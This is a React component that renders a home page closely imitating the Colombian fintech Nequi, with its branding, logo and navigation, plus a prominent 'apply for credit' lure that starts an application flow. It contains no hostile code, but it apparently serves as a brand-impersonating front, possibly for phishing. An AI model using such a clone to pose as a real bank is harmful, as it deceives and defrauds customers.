import { ChevronDown, CreditCard, GraduationCap, HelpCircle, BarChart3 } from 'lucide-react'
import { NequiLogo } from './NequiLogo'

interface HomeScreenProps {
  onStart: () => void
}

export function HomeScreen({ onStart }: HomeScreenProps) {
  return (
    <div className="min-h-screen w-full bg-white flex flex-col font-sans">
      {/* Top bar */}
      <div className="bg-[#2D1B6E] text-white/80 text-sm hidden md:flex">
        <div className="max-w-7xl mx-auto w-full flex">
          <button className="px-6 py-2.5 font-semibold text-white bg-[#E6005C] text-sm">Para personas</button>
          <button className="px-6 py-2.5 hover:text-white transition-colors text-sm">Para Negocios</button>
          <button className="px-6 py-2.5 hover:text-white transition-colors text-sm">Tienda virtual</button>
        </div>
      </div>

      {/* Navbar */}
      <header className="bg-white sticky top-0 z-30 border-b border-gray-100" style={{ height: '64px' }}>
        <div className="max-w-7xl mx-auto w-full h-full flex items-center justify-between px-6">
          <NequiLogo size="lg" color="dark" />

          <nav className="hidden md:flex items-center gap-1">
            {['Para personas', 'Ayuda', 'Conócenos'].map((item) => (
              <button key={item} className="flex items-center gap-1 text-[#2D1B6E] text-sm font-medium px-4 py-2 rounded-lg hover:bg-gray-50 transition-colors">
                {item}
                <ChevronDown className="w-4 h-4 text-gray-400" />
              </button>
            ))}
          </nav>

          <div className="flex items-center gap-2">
            <button className="hidden md:block bg-[#E6005C] text-white text-sm font-semibold px-5 py-2.5 rounded-lg hover:bg-[#c8004f] transition-colors">
              Paga tu crédito
            </button>
            <button className="hidden md:block border border-gray-200 text-[#2D1B6E] text-sm font-semibold px-5 py-2.5 rounded-lg hover:bg-gray-50 transition-colors">
              Entrar
            </button>
            <button className="bg-[#E6005C] text-white text-sm font-bold px-5 py-2.5 rounded-lg hover:bg-[#c8004f] transition-colors">
              Recargar
            </button>
          </div>
        </div>
      </header>

      {/* Hero */}
      <section className="relative w-full overflow-hidden" style={{ minHeight: '460px' }}>
        <img
          src="https://images.pexels.com/photos/5325585/pexels-photo-5325585.jpeg?auto=compress&cs=tinysrgb&w=1400"
          alt="Créditos Nequi"
          className="absolute inset-0 w-full h-full object-cover object-top"
        />
        <div className="absolute inset-0 bg-gradient-to-r from-black/60 via-black/30 to-transparent" />

        <div className="absolute right-[28%] top-[38%] hidden md:flex items-center gap-3 bg-white rounded-2xl px-5 py-3 shadow-lg animate-fade-in">
          <div className="w-9 h-9 rounded-full border-2 border-[#E6005C] flex items-center justify-center">
            <span className="text-[#E6005C] text-xl">:)</span>
          </div>
          <span className="text-[#2D1B6E] font-bold text-base">Créditos Nequi</span>
        </div>

        <div className="relative max-w-7xl mx-auto w-full px-6 py-16 md:py-24 flex flex-col justify-center h-full">
          <div className="max-w-md">
            <h1 className="text-4xl md:text-5xl font-black text-white leading-[1.1] mb-5 tracking-tight">
              Créditos en línea<br />confiables
            </h1>
            <div className="bg-white/15 backdrop-blur-sm rounded-xl px-5 py-4 mb-7 max-w-sm">
              <p className="text-white text-sm md:text-base leading-relaxed">
                Obtén un crédito de libre inversión en minutos.{' '}
                <strong className="font-bold">No te dejamos esperando con la respuesta de tu solicitud de crédito.</strong>
              </p>
            </div>
            <button
              onClick={onStart}
              className="bg-[#E6005C] hover:bg-[#c8004f] active:scale-95 text-white font-bold text-base px-7 py-3.5 rounded-lg shadow-[0_4px_20px_-4px_rgba(230,0,92,0.5)] transition-all duration-200"
            >
              Solicita tu crédito
            </button>
            <p className="text-white/60 text-xs mt-4">
              Aprobación sujeta a estudio de crédito y políticas de la entidad
            </p>
          </div>
        </div>
      </section>

      {/* Pink banner */}
      <div className="bg-[#E6005C] w-full">
        <div className="max-w-7xl mx-auto w-full flex flex-col md:flex-row items-center gap-4 px-6 py-5">
          <div className="flex-shrink-0">
            <div className="w-16 h-28 bg-[#2D1B6E] rounded-2xl flex items-center justify-center shadow-lg">
              <span className="text-white text-xs font-bold tracking-wider">Nequi</span>
            </div>
          </div>
          <p className="text-white text-sm md:text-base text-center md:text-left font-medium leading-relaxed flex-1">
            <strong className="font-bold">No estás solo en esta temporada de lluvias.</strong>{' '}
            Te acompañamos con opciones para que manejes tu crédito con más tranquilidad.
          </p>
          <button className="flex-shrink-0 bg-white text-[#2D1B6E] font-bold text-sm px-6 py-2.5 rounded-lg hover:bg-gray-50 transition-colors whitespace-nowrap">
            Conocer alivios
          </button>
        </div>
      </div>

      {/* 4 option cards */}
      <section className="bg-gray-50 w-full py-10">
        <div className="max-w-7xl mx-auto w-full px-6">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <OptionCard
              icon={<BarChart3 className="w-8 h-8 text-[#E6005C]" />}
              title="Simular un crédito"
            />
            <OptionCard
              icon={<CreditCard className="w-8 h-8 text-[#E6005C]" />}
              title="Quiero solicitar un crédito"
              onClick={onStart}
              highlight
            />
            <OptionCard
              icon={<GraduationCap className="w-8 h-8 text-[#E6005C]" />}
              title="Quiero aprender de créditos"
            />
            <OptionCard
              icon={<HelpCircle className="w-8 h-8 text-[#E6005C]" />}
              title="Pregunta frecuentes"
            />
          </div>
        </div>
      </section>
    </div>
  )
}

interface OptionCardProps {
  icon: React.ReactNode
  title: string
  onClick?: () => void
  highlight?: boolean
}

function OptionCard({ icon, title, onClick, highlight }: OptionCardProps) {
  return (
    <button
      onClick={onClick}
      className={`
        bg-white rounded-2xl p-6 flex flex-col items-center gap-4 text-center
        border transition-all duration-200 group
        ${highlight
          ? 'border-[#E6005C]/40 shadow-[0_4px_20px_-4px_rgba(230,0,92,0.2)] hover:shadow-[0_8px_30px_-6px_rgba(230,0,92,0.3)]'
          : 'border-gray-100 shadow-sm hover:shadow-md'
        }
        hover:-translate-y-0.5
      `}
    >
      <div className={`w-16 h-16 rounded-2xl flex items-center justify-center transition-colors ${highlight ? 'bg-[#E6005C]/10' : 'bg-gray-50 group-hover:bg-[#E6005C]/8'}`}>
        {icon}
      </div>
      <span className="text-[#2D1B6E] font-semibold text-sm leading-snug">{title}</span>
    </button>
  )
}
